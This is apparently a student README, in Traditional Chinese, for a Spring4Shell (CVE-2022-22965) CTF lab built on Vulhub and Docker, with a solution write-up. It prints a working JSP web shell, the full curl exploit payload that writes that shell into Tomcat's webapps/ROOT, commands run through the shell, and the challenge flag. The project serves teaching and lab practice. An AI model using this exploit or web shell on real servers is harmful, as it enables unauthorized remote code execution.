```markdown
# Spring4Shell (CVE-2022-22965) 漏洞環境搭建與 CTF 題目

##  專案簡介

本專案利用 Vulhub 搭建 Spring4Shell (CVE-2022-22965) 漏洞環境，並設計一個 CTF 題目，讓參與者透過遠端程式碼執行 (RCE) 漏洞讀取 Flag。

---

##  環境建置步驟

### 1. 安裝 Docker 與 Docker Compose

```bash
# 更新套件庫
sudo apt update

# 安裝 Docker 與 Docker Compose
sudo apt install docker.io docker-compose -y

# 啟動 Docker 服務
sudo systemctl start docker
sudo systemctl enable docker
```

### 2. 下載 Vulhub 漏洞環境

```bash
# 下載 Vulhub 專案
git clone https://github.com/vulhub/vulhub.git

# 進入 Spring4Shell 漏洞目錄
cd vulhub/spring/CVE-2022-22965
```

### 3. 啟動漏洞環境

```bash
# 啟動 Docker 容器
sudo docker-compose up -d

# 確認容器正常運行
sudo docker ps
```

<img width="800" height="115" alt="image" src="https://github.com/user-attachments/assets/e354fc91-262c-4648-a47b-818558a21b55" />

### 4. 驗證環境

開啟瀏覽器訪問 `http://localhost:8080/?name=Hacker&age=99`

<img width="1154" height="719" alt="image" src="https://github.com/user-attachments/assets/99198c87-56c9-454c-8241-7169299fbfe4" />


---

##  後門檔案 (shell.jsp)

攻擊成功後，後門檔案會被寫入 `webapps/ROOT/tomcatwar.jsp`，內容如下：

```jsp
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
    String line = null;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
}
%>
```

### 後門使用方式

透過 `cmd` 參數執行任意系統指令：

```
http://localhost:8080/tomcatwar.jsp?cmd=id
```

---

##  RCE 攻擊截圖

### 執行 `id` 指令

```bash
curl "http://localhost:8080/tomcatwar.jsp?cmd=id"
```

<img width="432" height="70" alt="image" src="https://github.com/user-attachments/assets/28be8ae2-2894-4b9f-bb22-ee9c89d5cc84" />


### 執行 `ls /` 指令

```bash
curl "http://localhost:8080/tomcatwar.jsp?cmd=ls%20/"
```

<img width="436" height="331" alt="image" src="https://github.com/user-attachments/assets/340fca5c-7d53-4419-9df1-4560287efe9f" />


---

##  CTF 題目說明

### 題目名稱
Spring4Shell 漏洞利用

### 題目描述
> 有一個使用 Spring MVC 框架的網站，似乎存在遠端程式碼執行漏洞。  
> 你能找到藏在伺服器中的 Flag 嗎？

### Flag 位置
```
/tmp/flag.txt
```

### Flag 內容
```
FLAG{Spring4Shell_Is_Dangerous}
```

---

##  Write-up 解題步驟

### 步驟 1：確認漏洞存在

訪問 `http://<target>:8080/?name=test&age=123`，確認參數綁定功能正常。

### 步驟 2：發送攻擊 Payload

利用 Spring4Shell 漏洞寫入 JSP 後門：

```bash
curl -X POST "http://<target>:8080/?" \
  -H "suffix: %>//" \
  -H "c1: Runtime" \
  -H "c2: <%" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=<% if(request.getParameter(\"cmd\")!=null){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

### 步驟 3：利用後門執行指令

訪問後門並執行 `id` 確認 RCE 成功：

```
http://<target>:8080/tomcatwar.jsp?cmd=id
```

### 步驟 4：讀取 Flag

```bash
curl "http://<target>:8080/tomcatwar.jsp?cmd=cat%20/tmp/flag.txt"
```

<img width="505" height="75" alt="image" src="https://github.com/user-attachments/assets/fdbefeaa-9b44-4643-854f-9872d26f05cc" />


### 步驟 5：獲得 Flag

```
FLAG{Spring4Shell_Is_Dangerous}
```

---

##  專案結構

```
Spring4Shell-CTF/
├── README.md           # 專案說明文件
├── screenshots/        # 截圖資料夾
│   ├── docker-ps.png
│   ├── parameter-binding.png
│   ├── rce-id.png
│   ├── rce-ls.png
│   └── flag-result.png
└── shell.jsp           # 後門檔案原始碼
```

---

##  參考資料

- [CVE-2022-22965 詳細分析](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Vulhub Spring4Shell 環境](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965)
- [Spring4Shell PoC](https://github.com/BobTheShoplifter/Spring4Shell-POC)

---

##  團隊成員

| 角色 | 姓名 | 工作內容 |
|------|------|----------|
| 組員 A | 黃鈺婷 | 環境搭建、攻擊實作、CTF 設計 |
| 組員 B | 利蓁琳 | 理論研究、簡報製作、影片剪輯 |

---

##  授權

本專案僅供教育與研究使用，請勿用於未經授權的系統。
